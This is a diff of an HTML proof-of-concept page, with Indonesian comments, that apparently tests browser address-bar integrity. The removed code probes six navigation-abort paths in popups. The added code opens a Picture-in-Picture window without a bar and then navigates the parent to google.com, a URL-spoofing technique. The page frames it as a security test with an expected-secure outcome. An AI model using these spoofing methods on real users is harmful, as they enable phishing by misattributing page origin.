@@ -1,41 +1,18 @@
-<!-- 16 | SAPUAN JENIS-ABORT — cari SEMUA cara navigasi batal tanpa meninggalkan dokumen | [1-CLICK]
-     15.html membuktikan 204 mengosongkan bar. Pertanyaan berikutnya yang menghasilkan famili,
-     bukan satu bug: cara pembatalan lain APA saja yang juga tidak meninggalkan dokumen?
-     Tiap baris di bawah adalah jalur kode pembatalan yang BERBEDA di dalam engine. Yang penting
-     bukan "semua batal" — melainkan mana yang meninggalkan bar KOSONG dan mana yang tidak.
-     Yang menyimpang = jalur yang belum di-harden.
-       204 No Content        server bilang "tidak ada isi"          <- terbukti di 15
-       205 Reset Content     sepupu 204, jalur berbeda
-       unduhan               Content-Disposition / tipe tak-render
-       skema asing           diserahkan ke OS lalu gagal
-       window.stop()         dibatalkan klien di tengah
-       about:blank           kontrol: tidak ada navigasi sama sekali
-     Enam jendela dibuka berurutan, masing-masing menulis label sendiri. BOUNDED, sekali jalan.
-     EXPECTED-SECURE  keenam meninggalkan bar dalam keadaan yang sama dan jujur. -->
-<button onclick="go()">Run 16 (6 jendela)</button>
-<pre id=g style="font:12px/1.7 monospace"></pre>
+<!doctype html><meta charset=utf-8>
+<!-- Beda dari chromeless-popup: di sana bar DIHILANGKAN. Di sini bar ADA dan BERBOHONG soal dokumen yang di atas.
+     PREDIKAT: PiP always-on-top tanpa bar = milikku; satu-satunya bar di layar melukis www.google.com
+     ORACLE: klik go -> screenshot SELURUH layar (PiP + jendela induk di belakangnya)
+     CONTROL: hapus baris location.href = T
+     EXPECTED-SECURE: PiP membawa atribusi origin sendiri, atau bar induk tetap jujur -->
+<button onclick="go()">go</button>
+<pre id=p></pre>
 <script>
-var T = [['204 No Content', 'https://www.google.com/gen_204'],
-['205 / beacon lain', 'https://www.google.com/csi'],
-['unduhan', 'probe.bin'],
-['skema asing', 'xnurx-noop://hold'],
-['window.stop()', 'https://www.google.com/'],
-['kontrol about:blank', '']];
-g.textContent = 'REAL ORIGIN: ' + location.href;
-function go() {
-  T.forEach(function (t, i) {
-    setTimeout(function () {
-      var w = window.open(t[1], '_blank', 'width=330,height=210,left=' + (20 + (i % 3) * 340) + ',top=' + (40 + Math.floor(i / 3) * 250));
-      if (!w) return;
-      if (t[0].indexOf('stop') === 0) setTimeout(function () { try { w.stop(); } catch (e) { } }, 30);
-      setTimeout(function () {
-        try { w.document.write('<div style="font:12px system-ui;padding:10px"><b>' + t[0] + '</b><br>ditulis oleh ' + location.origin + '</div>'); w.document.close(); } catch (e) { }
-      }, 2000);
-    }, i * 700);
-  });
-  g.textContent = 'REAL ORIGIN: ' + location.origin + '\n6 jendela dibuka.\n\n' +
-    T.map(function (t, i) { return '  ' + (i + 1) + '. ' + t[0].padEnd(22) + 'bar: ______'; }).join('\n') +
-    '\n\nIsi kolom bar: kosong / about:blank / URL tujuan / URL error.' +
-    '\nBaris yang KOSONG = jalur abort yang belum di-harden.';
+const T = 'https://www.google.com/';
+async function go(){
+  if (!self.documentPictureInPicture) return p.textContent = 'PiP API tidak ada = INERT (catat).';
+  const w = await documentPictureInPicture.requestWindow({ width: 420, height: 220 });
+  w.document.body.innerHTML = '<h2>PoC PANEL — tidak ada address bar di sini</h2><pre>REAL opener: ' + location.href + '</pre>';
+  location.href = T;
 }
+p.textContent = 'REAL: ' + location.href;
 </script>
